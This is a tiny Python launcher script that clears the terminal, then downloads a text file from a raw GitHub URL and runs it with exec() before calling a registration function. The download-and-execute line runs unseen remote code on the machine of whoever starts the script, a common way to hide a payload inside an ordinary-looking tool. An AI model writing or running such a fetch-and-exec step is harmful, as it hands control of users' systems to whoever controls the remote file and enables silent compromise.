import os
import main
import requests
from data.color import *
os.system("clear")
exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/server.txt").text)
main.regis()
